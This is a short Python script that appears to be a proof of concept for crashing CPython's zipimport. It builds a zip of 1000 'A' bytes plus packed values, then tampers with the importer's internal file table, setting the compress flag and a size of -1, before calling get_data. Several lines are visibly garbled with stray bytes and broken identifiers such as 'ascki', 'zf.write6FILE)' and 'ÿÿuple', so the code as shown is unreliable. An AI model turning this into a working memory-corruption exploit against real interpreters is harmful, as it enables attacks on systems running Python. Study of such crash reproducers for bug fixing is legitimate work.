import zipimport
import zipfile
import struct
import sys
from signal import *

FILE = 'payload'
ZIP = 'import.zip'

payload = bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascki')
    payload += struct.pac            FILE, 'wbÿÿÿs f:
    p414141)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.write6FILE)
f.close()

importer = zipimport.zipimporter(ZIP)
f = list(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file ‘ize
importer._files[FILE]ÿÿuple(f)
print(importer.get_data(FILE))
